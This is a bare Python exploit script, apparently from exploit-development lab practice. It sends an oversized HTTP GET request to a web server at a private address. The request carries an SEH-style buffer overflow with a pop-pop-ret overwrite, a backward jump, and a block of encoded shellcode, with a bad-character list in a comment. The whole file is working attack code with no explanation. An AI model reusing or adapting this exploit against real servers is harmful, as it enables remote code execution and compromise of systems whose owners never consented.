#!/usr/bin/python
import socket, sys
from struct import pack

host = '192.168.164.10'
port = 80

# \x09\x0a\x0b\x0c\x0d\x0e\x20\x00

def send_exploit_request():
    shellcode =  b"\x90"*30
    shellcode += b"\xbe\x54\xf4\x29\xf1\xd9\xc3\xd9\x74\x24\xf4"
    shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x72\x12\x03\x72\x12"
    shellcode += b"\x83\x96\xf0\xcb\x04\xea\x11\x89\xe7\x12\xe2"
    shellcode += b"\xee\x6e\xf7\xd3\x2e\x14\x7c\x43\x9f\x5e\xd0"
    shellcode += b"\x68\x54\x32\xc0\xfb\x18\x9b\xe7\x4c\x96\xfd"
    shellcode += b"\xc6\x4d\x8b\x3e\x49\xce\xd6\x12\xa9\xef\x18"
    shellcode += b"\x67\xa8\x28\x44\x8a\xf8\xe1\x02\x39\xec\x86"
    shellcode += b"\x5f\x82\x87\xd5\x4e\x82\x74\xad\x71\xa3\x2b"
    shellcode += b"\xa5\x2b\x63\xca\x6a\x40\x2a\xd4\x6f\x6d\xe4"
    shellcode += b"\x6f\x5b\x19\xf7\xb9\x95\xe2\x54\x84\x19\x11"
    shellcode += b"\xa4\xc1\x9e\xca\xd3\x3b\xdd\x77\xe4\xf8\x9f"
    shellcode += b"\xa3\x61\x1a\x07\x27\xd1\xc6\xb9\xe4\x84\x8d"
    shellcode += b"\xb6\x41\xc2\xc9\xda\x54\x07\x62\xe6\xdd\xa6"
    shellcode += b"\xa4\x6e\xa5\x8c\x60\x2a\x7d\xac\x31\x96\xd0"
    shellcode += b"\xd1\x21\x79\x8c\x77\x2a\x94\xd9\x05\x71\xf1"
    shellcode += b"\x2e\x24\x89\x01\x39\x3f\xfa\x33\xe6\xeb\x94"
    shellcode += b"\x7f\x6f\x32\x63\x7f\x5a\x82\xfb\x7e\x65\xf3"
    shellcode += b"\xd2\x44\x31\xa3\x4c\x6c\x3a\x28\x8c\x91\xef"
    shellcode += b"\xff\xdc\x3d\x40\x40\x8c\xfd\x30\x28\xc6\xf1"
    shellcode += b"\x6f\x48\xe9\xdb\x07\xe3\x10\x8c\xe7\x5c\x37"
    shellcode += b"\xf5\x80\x9e\x47\x04\xea\x16\xa1\x6c\x1c\x7f"
    shellcode += b"\x7a\x19\x85\xda\xf0\xb8\x4a\xf1\x7d\xfa\xc1"
    shellcode += b"\xf6\x82\xb5\x21\x72\x90\x22\xc2\xc9\xca\xe5"
    shellcode += b"\xdd\xe7\x62\x69\x4f\x6c\x72\xe4\x6c\x3b\x25"
    shellcode += b"\xa1\x43\x32\xa3\x5f\xfd\xec\xd1\x9d\x9b\xd7"
    shellcode += b"\x51\x7a\x58\xd9\x58\x0f\xe4\xfd\x4a\xc9\xe5"
    shellcode += b"\xb9\x3e\x85\xb3\x17\xe8\x63\x6a\xd6\x42\x3a"
    shellcode += b"\xc1\xb0\x02\xbb\x29\x03\x54\xc4\x67\xf5\xb8"
    shellcode += b"\x75\xde\x40\xc7\xba\xb6\x44\xb0\xa6\x26\xaa"
    shellcode += b"\x6b\x63\x46\x49\xb9\x9e\xef\xd4\x28\x23\x72"
    shellcode += b"\xe7\x87\x60\x8b\x64\x2d\x19\x68\x74\x44\x1c"
    shellcode += b"\x34\x32\xb5\x6c\x25\xd7\xb9\xc3\x46\xf2"

    size = 6000
    buffer  = b"A" * 2495
    buffer += pack("<L", (0x06eb9090))
    buffer += pack("<L", (0x101576c0))
    buffer+= b"\x90" * 4
    buffer += b"\xE9\xFD\xC8\xFF\xFF"
    buffer += shellcode
    buffer += b"\x90" * (size - len(buffer) - len(shellcode))

    #HTTP Request
    request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + host.encode() + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()
if __name__ == "__main__": 

    send_exploit_request()
